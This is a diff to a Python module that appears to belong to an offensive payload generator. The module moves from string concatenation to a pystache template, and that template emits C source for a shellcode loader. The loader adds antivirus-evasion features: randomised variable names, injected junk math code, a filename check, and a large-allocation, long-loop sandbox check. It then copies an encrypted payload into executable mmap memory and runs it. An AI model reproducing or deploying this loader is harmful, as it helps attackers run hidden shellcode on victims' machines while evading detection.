@@ -18,7 +18,9 @@
      #                                                                                      #
      ########################################################################################
 
-import random, string
+import pystache
+import random
+import string
 import sys 
 sys.path.append("Modules/payloads/auxiliar")
 sys.path.append("Modules/payloads/encryption")
@@ -27,78 +29,94 @@ import usefull
 import Multibyte_xor
 import Multibyte_xorPy3
 
+
+template_args = {} # Dictionnary containing all keys/values for template rendering
+
 Payload = sys.argv[1]
+template_args['Payload'] = Payload
 
 Filename = sys.argv[2]
+template_args['Filename'] = Filename
 
 Encryption = sys.argv[3]
+template_args['Encryption'] = Encryption
 
 Randbufname = usefull.varname_creator()
+template_args['Randbufname'] = Randbufname
 
-Payload = usefull.encoding_manager(Encryption,Payload,Randbufname)
+template_args['Payload'] = usefull.encoding_manager(Encryption,Payload,Randbufname)
 
-Randgood = usefull.varname_creator()
+template_args['Randgood'] = usefull.varname_creator()
 
-Randmem = usefull.varname_creator()
+template_args['Randmem'] = usefull.varname_creator()
 
-Randbig = random.randrange(60000000,120000000,1000000) 	
+template_args['Randbig'] = random.randrange(60000000,120000000,1000000) 	
 
-Randmaxop = usefull.varname_creator()
+template_args['Randcpt'] = usefull.varname_creator()
 
-Randcpt	= usefull.varname_creator()
+template_args['Randi'] = usefull.varname_creator()
 
-Randi =	usefull.varname_creator()
+template_args['Randptr'] = usefull.varname_creator()
 
-Randptr = usefull.varname_creator()
+template_args['Randinj'] = usefull.varname_creator()
 
-Randinj = usefull.varname_creator()
+template_args['Junkcode1'] = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
+template_args['Junkcode2'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode3'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode4'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode5'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode6'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode7'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode8'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+template_args['Junkcode9'] = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
 
-Junkcode1 = usefull.Junkmathinject(str(random.randint(1,16)))	        # Junkcode
-Junkcode2 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode3 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode4 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode5 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode6 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode7 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode8 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
-Junkcode9 = usefull.Junkmathinject(str(random.randint(1,16)))		# Junkcode
+Hollow_code = """\
+#define {{{Randgood}}} {{{Randbig}}}
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <string.h>
+#include <math.h>
 
-Hollow_code = ""
-Hollow_code += "#define " + Randgood + " " + str(Randbig) + "\n"
-Hollow_code += "#include <stdlib.h>\n#include <stdio.h>\n"
-Hollow_code += "#include <unistd.h>\n"
-Hollow_code += "#include <sys/mman.h>\n"
-Hollow_code += "#include <string.h>\n"
-Hollow_code += "#include <math.h>\n"
-Hollow_code += "int main(int argc,char * argv[]){\n"
-Hollow_code += Junkcode1
-Hollow_code += "if (strstr(argv[0], \"" + Filename + "\") > 0){\n"
-Hollow_code += "char *" + Randmem + " = NULL;\n"
-Hollow_code += Randmem + " = (char *) malloc("+ Randgood + ");\n"
-Hollow_code += "if ("+ Randmem + "!=NULL){\n"
-Hollow_code += "memset(" + Randmem + ",00," + Randgood + ");\n"
-Hollow_code += "free(" + Randmem + ");\n"
-Hollow_code += "int " + Randcpt + "  = 0;\n"
-Hollow_code += "int " + Randi + " = 0;\n"
-Hollow_code += "for("+ Randi + " = 0;" + Randi + " < " + Randgood + "; " + Randi + "++){\n"
-Hollow_code += Randcpt + "++;}\n"
-Hollow_code += "if("+ Randcpt + " == " + Randgood + "){\n"
-Hollow_code += Junkcode2
-Hollow_code += Payload
-Hollow_code += Junkcode3
-Hollow_code += "void *" + Randptr + ";"
-Hollow_code += Junkcode4
-Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
-Hollow_code += Junkcode5
-Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
-Hollow_code += Junkcode6
-Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
-Hollow_code += "else{" + Junkcode7 + "}\n"
-Hollow_code += "}else{" + Junkcode8 + "}\n"
-Hollow_code += "}else{" + Junkcode9 + "}\n"
-Hollow_code += "return 0;}"
-Hollow_code = Hollow_code.encode('utf-8')
+int main(int argc, char * argv[]){
+    {{{Junkcode1}}}
+    if (strstr(argv[0], "{{{Filename}}}") > 0){
+        char *{{{Randmem}}} = NULL;
+        {{{Randmem}}} = (char *) malloc({{{Randgood}}});
+        if ({{{Randmem}}}!=NULL){
+            memset({{{Randmem}}},0,{{{Randgood}}});
+            free({{{Randmem}}});
+            int {{{Randcpt}}} = 0;
+            int {{{Randi}}} = 0;
+            for({{{Randi}}} = 0;{{{Randi}}} < {{{Randgood}}}; {{{Randi}}}++){
+                {{{Randcpt}}}++;
+            }
+            if({{{Randcpt}}} == {{{Randgood}}}){
+                {{{Junkcode2}}}
+                {{{Payload}}}
+                {{{Junkcode3}}}
+                void *{{{Randptr}}};
+                {{{Junkcode4}}}
+                {{{Randptr}}} = mmap(0,sizeof({{{Randbufname}}}),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);
+                {{{Junkcode5}}}
+                memcpy({{{Randptr}}},{{{Randbufname}}}, sizeof({{{Randbufname}}}));
+                {{{Junkcode6}}}
+                int {{{Randinj}}}  = ((int(*)(void)){{{Randptr}}})();
+            }else{
+                {{{Junkcode7}}}
+            }
+        }else{
+            {{{Junkcode8}}}
+        }
+    }else{
+        {{{Junkcode9}}}
+    }
+    return 0;
+}
+"""
+
+Hollow_code = pystache.render(Hollow_code, template_args)
 
 with open('Source.c','wb') as f:
     f.write(Hollow_code)
-
